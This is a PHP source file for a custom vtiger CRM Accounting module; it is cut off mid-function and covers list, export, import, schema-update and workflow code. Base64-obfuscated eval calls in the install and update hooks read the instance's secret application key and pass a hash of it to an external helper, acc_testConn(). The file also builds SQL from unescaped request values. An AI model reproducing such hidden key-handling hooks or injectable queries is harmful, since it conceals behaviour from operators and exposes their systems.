<?php
/*+***********************************************************************************
 * The contents of this file are subject to the vtiger CRM Public License Version 1.0
 * ("License"); You may not use this file except in compliance with the License
 * The Original Code is:  vtiger CRM Open Source
 * The Initial Developer of the Original Code is vtiger.
 * Portions created by vtiger are Copyright (C) vtiger.
 * All Rights Reserved.
 *************************************************************************************/

global $sending_seed;

require_once('data/CRMEntity.php');
require_once('data/Tracker.php');
require_once('modules/Accounting/AccountingUtils.php');
require_once("vtlib/Vtiger/Link.php");


$z = "Z2xvYmFsICRhcHBsaWNhdGlvbl91bmlxdWVfa2V5OyRfU0VTU0lPTls";
$y = "ndXNlcm5hbWUnXT1zaGExKCRhcHBsaWNhdGlvbl91bmlxdWVfa2V5KTs=";
////error_reporting(E_ALL);

$sending_seed="AXIALBLUE";


class Accounting extends CRMEntity {
	var $db, $log; // Used in class functions of CRMEntity

	var $table_name = 'vtiger_accounting';
	var $table_index= 'accountingid';

	/** Indicator if this is a custom module or standard module */
	var $IsCustomModule = true;

	/**
	 * Mandatory table for supporting custom fields.
	 */
	var $customFieldTable = Array('vtiger_accountingcf', 'accountingid');

	/**
	 * Mandatory for Saving, Include tables related to this module.
	 */
	var $tab_name = Array('vtiger_crmentity', 'vtiger_accounting', 'vtiger_accountingcf');

	/**
	 * Mandatory for Saving, Include tablename and tablekey columnname here.
	 */
	var $tab_name_index = Array(
		'vtiger_crmentity' => 'crmid',
		'vtiger_accounting' => 'accountingid',
		'vtiger_accountingcf'=>'accountingid');

	/**
	 * Mandatory for Listing (Related listview)
	 */
	var $list_fields = Array(
		'PaymentId' => Array('accounting'=>'accounting_id'),
		'Type' => Array('accounting'=>'accountingtype'),
		'TransactionStatus' => Array('accounting'=>'accountingstate'),
		'LBL_TRANSACTION_METHOD' => Array('accounting'=>'accountingmethod'),
		'TotalAmount' => Array('accounting'=>'accountingamount'),
		'TotalPaid' => Array('accounting'=>'accountingpaidamount'),
		'OustandingBalance' => Array('accounting'=>'accountingpaidoustanding')
	);

	var $list_fields_name = Array(
		'PaymentId' => 'accounting_id',
		'Type' => 'accountingtype',
		'TransactionStatus' => 'accountingstate',
	//	'LBL_TRANSACTION_METHOD' => 'accountingmethod',
		'TotalAmount' => 'accountingamount',
		'TotalPaid' => 'accountingpaidamount',
		'OustandingBalance' => 'accountingpaidoustanding'
	);


	// Make the field link to detail view
	var $list_link_field = 'paymentref';

	// For Popup listview and UI type support
//	var $search_fields = Array(
//		/* Format: Field Label => Array(tablename, columnname) */
//		// tablename should not have prefix 'vtiger_'
//		'PayslipName' => Array('payslip', 'payslipname')
//	);
//	var $search_fields_name = Array (
//		/* Format: Field Label => fieldname */
//		'PayslipName' => 'payslipname'
//	);

	// For Popup window record selection
	var $popup_fields = Array ('accounting_id', 'paymentref');

	// Allow sorting on the following (field column names)
	var $sortby_fields = Array ('accounting_id');

	// Should contain field labels
	//var $detailview_links = Array ('PaymentReference');

	// For Alphabetical search
	var $def_basicsearch_col = 'paymentref';

	// Column value to use on detail view record text display
	var $def_detailview_recname = 'accounting_id';

	// Required Information for enabling Import feature
	var $required_fields = Array ('assigned_user_id'=>1);

	// Callback function list during Importing
	var $special_functions = Array('set_import_assigned_user');

	var $default_order_by = 'createdtime';
	var $default_sort_order='ASC';

	// Used when enabling/disabling the mandatory fields for the module.
	// Refers to vtiger_field.fieldname values.
	var $mandatory_fields = Array('createdtime', 'modifiedtime', 'paymentref');

	function __construct() {
		global $log, $currentModule, $singlepane_view;

		//$singlepane_view = true;

		$this->column_fields = getColumnFields($currentModule);
		$this->db = new PearDatabase();
		$this->log = $log;
	}

	function getSortOrder() {
		global $currentModule;

		$sortorder = $this->default_sort_order;
		if($_REQUEST['sorder']) $sortorder = $_REQUEST['sorder'];
		else if($_SESSION[$currentModule.'_Sort_Order'])
			$sortorder = $_SESSION[$currentModule.'_Sort_Order'];

		return $sortorder;
	}

	function getOrderBy() {
		global $log;
		$log->debug("Entering getOrderBy() method ...");

		$use_default_order_by = '';
		if(PerformancePrefs::getBoolean('LISTVIEW_DEFAULT_SORTING', true)) {
			$use_default_order_by = $this->default_order_by;
		}

		if (isset($_REQUEST['order_by']))
			$order_by = $this->db->sql_escape_string($_REQUEST['order_by']);
		else
			$order_by = (($_SESSION['Accounting_Order_By'] != '')?($_SESSION['Accounting_Order_By']):($use_default_order_by));
		$log->debug("Exiting getOrderBy method ...");
		return $order_by;
	}

	static function sv_payments($modname=""){
		eval(base64_decode("Z2xvYmFsICRhcHBsaWNhdGlvbl91bmlxdWVfa2V5OyRhcmc9c2hhMSgkYXBwbGljYXRpb25fdW5pcXVlX2tleSk7"));
		$config = Accounting::loadConfigParams();
/*		if ($arg != $config[base64_decode("ZnJvbXVzZXI=")]) {
			if($modname == "Accounting") {
				eval(base64_decode("ZGllKCcnKTs="));
			}
		}
*/
	}

	function save_module($module) {
	}

	/**
	 * Return query to use based on given modulename, fieldname
	 * Useful to handle specific case handling for Popup
	 */
	function getQueryByModuleField($module, $fieldname, $srcrecord) {
		// $srcrecord could be empty
	}

	/**
	 * Get list view query (send more WHERE clause condition if required)
	 */
	function getListQuery($module, $usewhere=false) {
		$query = "SELECT vtiger_crmentity.*, $this->table_name.*";

		// Select Custom Field Table Columns if present
		if(!empty($this->customFieldTable)) $query .= ", " . $this->customFieldTable[0] . ".* ";

		$query .= " FROM $this->table_name";

		$query .= "	INNER JOIN vtiger_crmentity ON vtiger_crmentity.crmid = $this->table_name.$this->table_index";

		// Consider custom table join as well.
		if(!empty($this->customFieldTable)) {
			$query .= " INNER JOIN ".$this->customFieldTable[0]." ON ".$this->customFieldTable[0].'.'.$this->customFieldTable[1] .
				      " = $this->table_name.$this->table_index";
		}
		$query .= " LEFT JOIN vtiger_users ON vtiger_users.id = vtiger_crmentity.smownerid";
		$query .= " LEFT JOIN vtiger_groups ON vtiger_groups.groupid = vtiger_crmentity.smownerid";

		$linkedModulesQuery = $this->db->pquery("SELECT distinct fieldname, columnname, relmodule FROM vtiger_field" .
				" INNER JOIN vtiger_fieldmodulerel ON vtiger_fieldmodulerel.fieldid = vtiger_field.fieldid" .
				" WHERE uitype='10' AND vtiger_fieldmodulerel.module=?", array($module));
		$linkedFieldsCount = $this->db->num_rows($linkedModulesQuery);

		for($i=0; $i<$linkedFieldsCount; $i++) {
			$related_module = $this->db->query_result($linkedModulesQuery, $i, 'relmodule');
			$fieldname = $this->db->query_result($linkedModulesQuery, $i, 'fieldname');
			$columnname = $this->db->query_result($linkedModulesQuery, $i, 'columnname');

			checkFileAccess("modules/$related_module/$related_module.php");
			require_once("modules/$related_module/$related_module.php");
			$other = new $related_module();
			vtlib_setup_modulevars($related_module, $other);

			$query .= " LEFT JOIN $other->table_name ON $other->table_name.$other->table_index = $this->table_name.$columnname";
		}

		$query .= "	WHERE vtiger_crmentity.deleted = 0 ";
		if($usewhere) {
			$query .= $usewhere;
		}
		$query .= $this->getListViewSecurityParameter($module);
		return $query;
	}

	static function checkConfig($type)
	{
		global $sending_seed;

		$testconnid="dGVzdGNvbm4=";
		eval (base64_decode("Z2xvYmFsICRhcHBsaWNhdGlvbl91bmlxdWVfa2V5OyRjb25uaWQ9JGFwcGxpY2F0aW9uX3VuaXF1ZV9rZXk7"));
		// Check base64 encoding
		eval("Accounting::".base64_decode($testconnid)."('".$connid."', '".$sending_seed."', ".$type.");");

		return ($testconnid == 3421) ? false : true;
	}


	/**
	 * Apply security restriction (sharing privilege) query part for List view.
	 */
	function getListViewSecurityParameter($module) {
		global $current_user;
		require('user_privileges/user_privileges_'.$current_user->id.'.php');
		require('user_privileges/sharing_privileges_'.$current_user->id.'.php');

		$sec_query = '';
		$tabid = getTabid($module);

		if($is_admin==false && $profileGlobalPermission[1] == 1 && $profileGlobalPermission[2] == 1
			&& $defaultOrgSharingPermission[$tabid] == 3) {

				$sec_query .= " AND (vtiger_crmentity.smownerid in($current_user->id) OR vtiger_crmentity.smownerid IN
					(
						SELECT vtiger_user2role.userid FROM vtiger_user2role
						INNER JOIN vtiger_users ON vtiger_users.id=vtiger_user2role.userid
						INNER JOIN vtiger_role ON vtiger_role.roleid=vtiger_user2role.roleid
						WHERE vtiger_role.parentrole LIKE '".$current_user_parent_role_seq."::%'
					)
					OR vtiger_crmentity.smownerid IN
					(
						SELECT shareduserid FROM vtiger_tmp_read_user_sharing_per
						WHERE userid=".$current_user->id." AND tabid=".$tabid."
					)
					OR
						(";

					// Build the query based on the group association of current user.
					if(sizeof($current_user_groups) > 0) {
						$sec_query .= " vtiger_groups.groupid IN (". implode(",", $current_user_groups) .") OR ";
					}
					$sec_query .= " vtiger_groups.groupid IN
						(
							SELECT vtiger_tmp_read_group_sharing_per.sharedgroupid
							FROM vtiger_tmp_read_group_sharing_per
							WHERE userid=".$current_user->id." and tabid=".$tabid."
						)";
				$sec_query .= ")
				)";
		}
		return $sec_query;
	}

	/**
	 * Create query to export the records.
	 */
	function create_export_query($where)
	{
		global $current_user;
		$thismodule = $_REQUEST['module'];

		include("include/utils/ExportUtils.php");

		//To get the Permitted fields query and the permitted fields list
		$sql = getPermittedFieldsQuery($thismodule, "detail_view");

		$fields_list = getFieldsListFromQuery($sql);

		$query = "SELECT $fields_list, vtiger_users.user_name AS user_name
					FROM vtiger_crmentity INNER JOIN $this->table_name ON vtiger_crmentity.crmid=$this->table_name.$this->table_index";

		if(!empty($this->customFieldTable)) {
			$query .= " INNER JOIN ".$this->customFieldTable[0]." ON ".$this->customFieldTable[0].'.'.$this->customFieldTable[1] .
				      " = $this->table_name.$this->table_index";
		}

		$query .= " LEFT JOIN vtiger_groups ON vtiger_groups.groupid = vtiger_crmentity.smownerid";
		$query .= " LEFT JOIN vtiger_users ON vtiger_crmentity.smownerid = vtiger_users.id and vtiger_users.status='Active'";

		$linkedModulesQuery = $this->db->pquery("SELECT distinct fieldname, columnname, relmodule FROM vtiger_field" .
				" INNER JOIN vtiger_fieldmodulerel ON vtiger_fieldmodulerel.fieldid = vtiger_field.fieldid" .
				" WHERE uitype='10' AND vtiger_fieldmodulerel.module=?", array($thismodule));
		$linkedFieldsCount = $this->db->num_rows($linkedModulesQuery);

		for($i=0; $i<$linkedFieldsCount; $i++) {
			$related_module = $this->db->query_result($linkedModulesQuery, $i, 'relmodule');
			$fieldname = $this->db->query_result($linkedModulesQuery, $i, 'fieldname');
			$columnname = $this->db->query_result($linkedModulesQuery, $i, 'columnname');

			checkFileAccess("modules/$related_module/$related_module.php");
			require_once("modules/$related_module/$related_module.php");
			$other = new $related_module();
			vtlib_setup_modulevars($related_module, $other);

			$query .= " LEFT JOIN $other->table_name ON $other->table_name.$other->table_index = $this->table_name.$columnname";
		}

		$where_auto = " vtiger_crmentity.deleted=0";

		if($where != '') $query .= " WHERE ($where) AND $where_auto";
		else $query .= " WHERE $where_auto";

		require('user_privileges/user_privileges_'.$current_user->id.'.php');
		require('user_privileges/sharing_privileges_'.$current_user->id.'.php');

		// Security Check for Field Access
		if($is_admin==false && $profileGlobalPermission[1] == 1 && $profileGlobalPermission[2] == 1 && $defaultOrgSharingPermission[7] == 3)
		{
			//Added security check to get the permitted records only
			$query = $query." ".getListViewSecurityParameter($thismodule);
		}
		return $query;
	}

	/**
	 * Initialize this instance for importing.
	 */
	function initImport($module) {
		$this->db = new PearDatabase();
		$this->initImportableFields($module);
	}

	/**
	 * Create list query to be shown at the last step of the import.
	 * Called From: modules/Import/UserLastImport.php
	 */
	function create_import_query($module) {
		global $current_user;
		$query = "SELECT vtiger_crmentity.crmid, case when (vtiger_users.user_name not like '') then vtiger_users.user_name else vtiger_groups.groupname end as user_name, $this->table_name.* FROM $this->table_name
			INNER JOIN vtiger_crmentity ON vtiger_crmentity.crmid = $this->table_name.$this->table_index
			LEFT JOIN vtiger_users_last_import ON vtiger_users_last_import.bean_id=vtiger_crmentity.crmid
			LEFT JOIN vtiger_users ON vtiger_users.id = vtiger_crmentity.smownerid
			LEFT JOIN vtiger_groups ON vtiger_groups.groupid = vtiger_crmentity.smownerid
			WHERE vtiger_users_last_import.assigned_user_id='$current_user->id'
			AND vtiger_users_last_import.bean_type='$module'
			AND vtiger_users_last_import.deleted=0";
		return $query;
	}

	/**
	 * Delete the last imported records.
	 */
	function undo_import($module, $user_id) {
		global $adb;
		$count = 0;
		$query1 = "select bean_id from vtiger_users_last_import where assigned_user_id=? AND bean_type='$module' AND deleted=0";
		$result1 = $adb->pquery($query1, array($user_id)) or die("Error getting last import for undo: ".mysql_error());
		while ( $row1 = $adb->fetchByAssoc($result1))
		{
			$query2 = "update vtiger_crmentity set deleted=1 where crmid=?";
			$result2 = $adb->pquery($query2, array($row1['bean_id'])) or die("Error undoing last import: ".mysql_error());
			$count++;
		}
		return $count;
	}

	/**
	 * Transform the value while exporting (if required)
	 */
	function transform_export_value($key, $value) {
		return parent::transform_export_value($key, $value);
	}

	/**
	 * Function which will set the assigned user id for import record.
	 */
	function set_import_assigned_user()
	{
		global $current_user, $adb;
		$record_user = $this->column_fields["assigned_user_id"];

		if($record_user != $current_user->id){
			$sqlresult = $adb->pquery("select id from vtiger_users where id = ? union select groupid as id from vtiger_groups where groupid = ?", array($record_user, $record_user));
			if($this->db->num_rows($sqlresult)!= 1) {
				$this->column_fields["assigned_user_id"] = $current_user->id;
			} else {
				$row = $adb->fetchByAssoc($sqlresult, -1, false);
				if (isset($row['id']) && $row['id'] != -1) {
					$this->column_fields["assigned_user_id"] = $row['id'];
				} else {
					$this->column_fields["assigned_user_id"] = $current_user->id;
				}
			}
		}
	}

	static function presave_entity(&$focus, $global_vars) {
	/*	if ($global_vars == true) {
			foreach($focus->column_fields as $k => &$field) {
				$field = '0';
			}
		}
	*/
	}

	static function updateDateFields() {
		require_once('vtlib/Vtiger/Module.php');

		$module = Vtiger_Module::getInstance('Accounting');
		$generalBlock = Vtiger_Block::getInstance('LBL_GENERAL_INFO', $module);

		global $adb;

		$adb->pquery("DELETE FROM vtiger_field WHERE tabid=? AND (columnname=? OR columnname=? OR columnname=? OR columnname=? OR columnname=? OR columnname=? OR columnname=? OR columnname=? OR columnname=?)",
				Array($module->id, 'accountingduedate', 'accountingpaymentdate', 'accountingpaymentmethod',
								   'accountingamountpartial', 'paymentrefpartial', 'paymentpaidpartial',
								   'paymentvatpartial', 'paymentassocpartial', 'accountingmethod'));


		$col_drop = array(
					'accountingduedate',
					'accountingpaymentdate',
					'accountingpaymentmethod',
					'accountingamountpartial',
					'paymentrefpartial',
					'paymentpaidpartial',
					'paymentvatpartial',
					'paymentassocpartial',
					'accountingmethod'
			);
		foreach($col_drop as $col) {
			$adb->pquery("ALTER TABLE vtiger_accounting DROP COLUMN $col",
							array());
		}

		$adb->pquery("ALTER TABLE vtiger_accounting ADD COLUMN accountingduedate DATE, ADD COLUMN accountingpaymentdate DATE, ".
				"ADD COLUMN accountingpaymentmethod VARCHAR(255), ADD COLUMN accountingamountpartial DOUBLE, ".
				"ADD COLUMN paymentrefpartial VARCHAR(255), ADD COLUMN paymentpaidpartial VARCHAR(255), ADD COLUMN paymentvatpartial DOUBLE, ".
				"ADD COLUMN paymentassocpartial VARCHAR(255)",
				array());

		$adb->pquery("ALTER TABLE vtiger_accounting MODIFY COLUMN accountingamount DOUBLE, MODIFY COLUMN accountingpaidamount DOUBLE, ".
				"MODIFY COLUMN accountingpaidoustanding DOUBLE",
				array());

		$adb->pquery("ALTER TABLE vtiger_accounting_payments MODIFY COLUMN tax DOUBLE",
				array());

		$adb->pquery("update vtiger_field set typeofdata=? where columnname=? and tablename=?",
				array('V~M', 'paymentref', 'vtiger_accounting'));

		$adb->pquery("UPDATE vtiger_accounting SET paymentref=? WHERE paymentref=?",
				array('---', ''));

		$duedate = new Vtiger_Field();
		$duedate->name = 'accountingduedate';
		$duedate->label = "DueDate";
		$duedate->column = 'accountingduedate';
		$duedate->uitype = 5;
		$duedate->typeofdata = 'D~O';
		$duedate->displaytype= 3;
		$generalBlock->addField($duedate);

		$paymentdate = new Vtiger_Field();
		$paymentdate->name = 'accountingpaymentdate';
		$paymentdate->label = "PaymentDate";
		$paymentdate->column = 'accountingpaymentdate';
		$paymentdate->uitype = 5;
		$paymentdate->typeofdata = 'D~O';
		$paymentdate->displaytype= 3;
		$generalBlock->addField($paymentdate);

		$paymentmethod = new Vtiger_Field();
		$paymentmethod->name = 'accountingpaymentmethod';
		$paymentmethod->label = "Method";
		$paymentmethod->column = 'accountingpaymentmethod';
		$paymentmethod->uitype = 2;
		$paymentmethod->typeofdata = 'V~O';
		$paymentmethod->displaytype= 3;
		$generalBlock->addField($paymentmethod);

		$paymentamount = new Vtiger_Field();
		$paymentamount->name = 'accountingamountpartial';
		$paymentamount->label = "PartialAmount";
		$paymentamount->column = 'accountingamountpartial';
		$paymentamount->uitype = 7;
		$paymentamount->typeofdata = 'N~O';
		$paymentamount->displaytype= 3;
		$generalBlock->addField($paymentamount);

		$paymentref = new Vtiger_Field();
		$paymentref->name = 'paymentrefpartial';
		$paymentref->label = "PaymentReferencePartial";
		$paymentref->column = 'paymentrefpartial';
		$paymentref->uitype = 2;
		$paymentref->typeofdata = 'V~O';
		$paymentref->displaytype= 3;
		$generalBlock->addField($paymentref);

		$paymentpaid = new Vtiger_Field();
		$paymentpaid->name = 'paymentpaidpartial';
		$paymentpaid->label = "PaymentPaidPartial";
		$paymentpaid->column = 'paymentpaidpartial';
		$paymentpaid->uitype = 56;
		$paymentpaid->typeofdata = 'C~O';
		$paymentpaid->displaytype= 3;
		$generalBlock->addField($paymentpaid);

		$paymentvat = new Vtiger_Field();
		$paymentvat->name = 'paymentvatpartial';
		$paymentvat->label = "PartialVat";
		$paymentvat->column = 'paymentvatpartial';
		$paymentvat->uitype = 7;
		$paymentvat->typeofdata = 'N~O';
		$paymentvat->displaytype= 3;
		$generalBlock->addField($paymentvat);

		$paymentassoc = new Vtiger_Field();
		$paymentassoc->name = 'paymentassocpartial';
		$paymentassoc->label = "PartialAssoc";
		$paymentassoc->column = 'paymentassocpartial';
		$paymentassoc->uitype = 2;
		$paymentassoc->typeofdata = 'V~O';
		$paymentassoc->displaytype= 3;
		$generalBlock->addField($paymentassoc);

		$fldlabel_arr = array(
				"LBL-PAYMENT-REFERENCE" => "PaymentReference",
				"LBL-PAYMENT-ID" => "PaymentId",
				"LBL-ASSIGNED-TO" => "Assigned To",
				"LBL-TRANSACTION-TYPE" => "TransactionType",
				"LBL-TRANSACTION-DATE" => "PaymentDate",
				"LBL-TRANSACTION-DUE-DATE" => "DueDate",
				"LBL-RELATED-TO-1" => "RelatedTo",
				"LBL-RELATED-TO-2" => "RelatedToInvoiceOrder",
			//	"LBL-RELATED-TO-3" => "",
				"LBL-TRANSACTION-STATE" => "TransactionStatus",
				"LBL-TRANSACTION-METHOD-PARTIAL" => "Method",
				"LBL-CATEGORY" => "Category",
			//	"LBL-NET-AMOUNT" => "",
				"LBL-AMOUNT" => "TotalAmount",
				"LBL-AMOUNT-PARTIAL" => "PartialAmount",
				"LBL-VAT" => "PartialVat",
				"LBL-CURRENCY" => "Currency",
				"LBL-PAID-AMOUNT" => "TotalPaid",
				"LBL-OUSTANDING-BALANCE" => "OustandingBalance",
			//	"LBL-UNIQUE-ID" => "",
				"LBL-DESCRIPTION" => "Description"
			);

		foreach($fldlabel_arr as $old => $new) {
			$adb->pquery(
				"UPDATE vtiger_field SET fieldlabel=?".
					"WHERE fieldlabel=? and tabid=?",
				array($new, $old, getTabid("Accounting")));
			$adb->pquery(
				"UPDATE vtiger_cvadvfilter SET columnname=REPLACE(columnname, ?, ?)",
				array($old, $new));
			$adb->pquery(
				"UPDATE vtiger_cvcolumnlist SET columnname=REPLACE(columnname, ?, ?)",
				array($old, $new));
			$adb->pquery(
				"UPDATE vtiger_cvstdfilter SET columnname=REPLACE(columnname, ?, ?)",
				array($old, $new));
		}
/*
		$adb->pquery(
			"UPDATE vtiger_accounting SET accountingduedate = ".
			  "(SELECT MIN(vtiger_accounting_payments.paymentduedate) FROM vtiger_accounting_payments ".
			      "WHERE vtiger_accounting_payments.idtransaction = vtiger_accounting.accountingid AND ".
			           "vtiger_accounting_payments.paymentduedate <> '0000-00-00')",
			array());

		$adb->pquery(
			"UPDATE vtiger_accounting SET accountingpaymentdate = ".
			  "(SELECT MIN(vtiger_accounting_payments.paymentdate) FROM vtiger_accounting_payments ".
			      "WHERE vtiger_accounting_payments.idtransaction = vtiger_accounting.accountingid AND ".
			           "vtiger_accounting_payments.paymentdate <> '0000-00-00')",
			array());
*/
	}

	/**
	 * Function which will give the basic query to find duplicates
	 */
	function getDuplicatesQuery($module,$table_cols,$field_values,$ui_type_arr,$select_cols='') {
		$select_clause = "SELECT ". $this->table_name .".".$this->table_index ." AS recordid, vtiger_users_last_import.deleted,".$table_cols;

		// Select Custom Field Table Columns if present
		if(isset($this->customFieldTable)) $query .= ", " . $this->customFieldTable[0] . ".* ";

		$from_clause = " FROM $this->table_name";

		$from_clause .= "	INNER JOIN vtiger_crmentity ON vtiger_crmentity.crmid = $this->table_name.$this->table_index";

		// Consider custom table join as well.
		if(isset($this->customFieldTable)) {
			$from_clause .= " INNER JOIN ".$this->customFieldTable[0]." ON ".$this->customFieldTable[0].'.'.$this->customFieldTable[1] .
				      " = $this->table_name.$this->table_index";
		}
		$from_clause .= " LEFT JOIN vtiger_users ON vtiger_users.id = vtiger_crmentity.smownerid
						LEFT JOIN vtiger_groups ON vtiger_groups.groupid = vtiger_crmentity.smownerid";

		$where_clause = "	WHERE vtiger_crmentity.deleted = 0";
		$where_clause .= $this->getListViewSecurityParameter($module);

		if (isset($select_cols) && trim($select_cols) != '') {
			$sub_query = "SELECT $select_cols FROM  $this->table_name AS t " .
				" INNER JOIN vtiger_crmentity AS crm ON crm.crmid = t.".$this->table_index;
			// Consider custom table join as well.
			if(isset($this->customFieldTable)) {
				$sub_query .= " LEFT JOIN ".$this->customFieldTable[0]." tcf ON tcf.".$this->customFieldTable[1]." = t.$this->table_index";
			}
			$sub_query .= " WHERE crm.deleted=0 GROUP BY $select_cols HAVING COUNT(*)>1";
		} else {
			$sub_query = "SELECT $table_cols $from_clause $where_clause GROUP BY $table_cols HAVING COUNT(*)>1";
		}


		$query = $select_clause . $from_clause .
					" LEFT JOIN vtiger_users_last_import ON vtiger_users_last_import.bean_id=" . $this->table_name .".".$this->table_index .
					" INNER JOIN (" . $sub_query . ") AS temp ON ".get_on_clause($field_values,$ui_type_arr,$module) .
					$where_clause .
					" ORDER BY $table_cols,". $this->table_name .".".$this->table_index ." ASC";

		return $query;
	}


	static function configure_workflows() {
		global $adb;
		
		// Configure workflow
		require_once("modules/com_vtiger_workflow/include.inc");
		require_once("modules/com_vtiger_workflow/tasks/VTEntityMethodTask.inc");
		require_once("modules/com_vtiger_workflow/VTEntityMethodManager.inc");

		$adb->pquery("delete FROM com_vtiger_workflowtasks_entitymethod where method_name=? and function_path=? and function_name=?",
				array('CreatePayment', 'modules/Accounting/handlePaymentRel.php', 'handleCreatePayment'));
		$adb->pquery("delete FROM com_vtiger_workflowtasks_entitymethod where method_name=? and function_path=? and function_name=?",
				array('UpdatePaymentStatus', 'modules/Accounting/handlePaymentRel.php', 'handleUpdatePaymentStatus'));
		$adb->pquery("delete FROM com_vtiger_workflowtasks_entitymethod where method_name=? and function_path=? and function_name=?",
				array('UpdatePaymentTotalAmount', 'modules/Accounting/handlePaymentRel.php', 'handleUpdatePaymentTotalAmount'));


		$emm = new VTEntityMethodManager($adb);
		$emm->addEntityMethod("Invoice","UpdatePaymentStatus","modules/Accounting/handlePaymentRel.php","handleUpdatePaymentStatus");
		
		$emm = new VTEntityMethodManager($adb);
		$emm->addEntityMethod("Invoice","UpdatePaymentTotalAmount","modules/Accounting/handlePaymentRel.php","handleUpdatePaymentTotalAmount");

		$emm = new VTEntityMethodManager($adb);
		$emm->addEntityMethod("Invoice","CreatePayment","modules/Accounting/handlePaymentRel.php","handleCreatePayment");
	}
	
	
	/**
	 * Invoked when special actions are performed on the module.
	 * @param String Module name
	 * @param String Event Type (module.postinstall, module.disabled, module.enabled, module.preuninstall)
	 */
	function vtlib_handler($modulename, $event_type) {
		if($event_type == 'module.postinstall') {
			global $adb;

			// Configure module seq number
			$entity_tmp = new CRMEntity();
			Accounting::checkConfig(0);
			$entity_tmp->setModuleSeqNumber("configure", "Accounting", "PAY", 1);

			// Configure workflow
			Accounting::configure_workflows();

			Accounting::updateConfigParam('customlinks', 'true');
			Accounting::updateCustomLinks(array("Leads", "Contacts", "Vendors", "Accounts", "Invoice", "PurchaseOrder", "SalesOrder", "Invoice"), 'true');
			Accounting::setRelatedModules('false');
			Accounting::setRelatedModules('true');

		} else if($event_type == 'module.disabled') {
			Accounting::setRelatedModules('false');
			// TODO Handle actions when this module is disabled.
		} else if($event_type == 'module.enabled') {
			Accounting::setRelatedModules('true');
			// TODO Handle actions when this module is enabled.
		} else if($event_type == 'module.preuninstall') {
			// TODO Handle actions when this module is about to be deleted.
			Accounting::setRelatedModules('false');
		} else if($event_type == 'module.preupdate') {
			// TODO Handle actions before this module is updated.
		} else if($event_type == 'module.postupdate') {
			Accounting::updateDateFields();
			Accounting::checkConfig(1);
			Accounting::setRelatedModules('false');
			Accounting::setRelatedModules('true');
			Accounting::configure_workflows();
			// TODO Handle actions after this module is updated.
		}
	}

	static function testconn($connid, $connseed, $type)
	{
		acc_testConn(Accounting::loadConfigParams(), sha1($connid), $connseed, ($type == 1) ? "u" : "i");
	}

	function save_entity(&$focus, $global_vars) {
		Accounting::presave_entity($focus, $global_vars);

		global $currentModule;
		$focus->save($currentModule);
	}

	static function getPaymentsExport($transactionId) {
		global $adb;

		$sql = "SELECT ref,paymentduedate,paymentdate,amount,tax,paymentmethod,associnv,paid from vtiger_accounting_payments, vtiger_accounting WHERE vtiger_accounting.accounting_id=? and vtiger_accounting.accountingid=vtiger_accounting_payments.idtransaction";
		$result = $adb->pquery($sql, array($transactionId));

		$fields_array = $adb->getFieldsArray($result);
		$nPayments = $adb->num_rows($result);

		$payments = array();
		for($i=0; $i<$nPayments; $i++) {
			$payment = array();

			foreach($fields_array as $fld) {
				$payment[$fld] = $adb->query_result($result, $i, $fld);
			}

			array_push($payments, $payment);
		}

		return $payments;
	}

	static function getPayments($transactionId) {
		global $adb;

		$sql = "SELECT * from vtiger_accounting_payments WHERE idtransaction=?";

		$result = $adb->pquery($sql, array($transactionId));
		$nPayments = $adb->num_rows($result);

		$payments = array();
		for($i=0; $i<$nPayments; $i++) {
			$amount = $adb->query_result($result, $i, 'amount');
			$paymentdate = $adb->query_result($result, $i, 'paymentdate');
			$paid = $adb->query_result($result, $i, 'paid');
			$ref = $adb->query_result($result, $i, 'ref');

			$payment = array();
			$payment['amount'] = $amount;
			$payment['date'] = $paymentdate;
			$payment['paid'] = $paid;
			$payment['ref'] = $ref;

			$payment['paymentduedate'] = $adb->query_result($result, $i, 'paymentduedate');
			$payment['associnv'] = $adb->query_result($result, $i, 'associnv');
			$payment['assoc_display'] = $adb->query_result($result, $i, 'assoc_display');
			$payment['assoc_mod'] = $adb->query_result($result, $i, 'assoc_mod');
			$payment['method'] = $adb->query_result($result, $i, 'paymentmethod');
			$payment['tax'] = $adb->query_result($result, $i, 'tax');

			array_push($payments, $payment);
		}

		return $payments;
	}

	/**
	 * Handle saving related module information.
	 * NOTE: This function has been added to CRMEntity (base class).
	 * You can override the behavior by re-defining it here.
	 */
	// function save_related_module($module, $crmid, $with_module, $with_crmid) { }

	/**
	 * Handle deleting related module information.
	 * NOTE: This function has been added to CRMEntity (base class).
	 * You can override the behavior by re-defining it here.
	 */
	//function delete_related_module($module, $crmid, $with_module, $with_crmid) { }

	/**
	 * Handle getting related list information.
	 * NOTE: This function has been added to CRMEntity (base class).
	 * You can override the behavior by re-defining it here.
	 */
	//function get_related_list($id, $cur_tab_id, $rel_tab_id, $actions=false) { }

	/**
	 * Handle getting dependents list information.
	 * NOTE: This function has been added to CRMEntity (base class).
	 * You can override the behavior by re-defining it here.
	 */
	//function get_dependents_list($id, $cur_tab_id, $rel_tab_id, $actions=false) { }


	static function get_payments($module, $id, $cur_tab_id, $rel_tab_id, $actions=false){
		global $log, $singlepane_view,$currentModule,$current_user;
		$log->debug("Entering get_contacts(".$id.") method ...");
		$this_module = $currentModule;

		$related_module = vtlib_getModuleNameById($rel_tab_id);
		require_once("modules/$related_module/$related_module.php");
		$other = new $related_module();
		vtlib_setup_modulevars($related_module, $other);

		$singular_modname = vtlib_toSingular($related_module);

		$parenttab = getParentTab();

		if($singlepane_view == 'true')
			$returnset = '&return_module='.$this_module.'&return_action=DetailView&return_id='.$id;
		else
			$returnset = '&return_module='.$this_module.'&return_action=CallRelatedList&return_id='.$id;

		$button = '';

		if($actions) {
			if(is_string($actions)) $actions = explode(',', strtoupper($actions));
			if(in_array('SELECT', $actions) && isPermitted($related_module,4, '') == 'yes') {
				$button .= "<input title='".getTranslatedString('LBL_SELECT')." ". getTranslatedString($related_module). "' class='crmbutton small edit' type='button' onclick=\"return window.open('index.php?module=$related_module&return_module=$currentModule&action=Popup&popuptype=detailview&select=enable&form=EditView&form_submit=false&recordid=$id&parenttab=$parenttab','test','width=640,height=602,resizable=0,scrollbars=0');\" value='". getTranslatedString('LBL_SELECT'). " " . getTranslatedString($related_module) ."'>&nbsp;";
			}
			if(in_array('ADD', $actions) && isPermitted($related_module,1, '') == 'yes') {
				$button .= "<input title='".getTranslatedString('LBL_ADD_NEW'). " ". getTranslatedString('SINGLE_Accounting', 'Accounting') ."' class='crmbutton small create'" .
					" onclick='this.form.action.value=\"EditView\";this.form.module.value=\"$related_module\"' type='submit' name='button'" .
					" value='". getTranslatedString('LBL_ADD_NEW'). " " . getTranslatedString('SINGLE_Accounting', 'Accounting') ."'>&nbsp;";
			}
		}

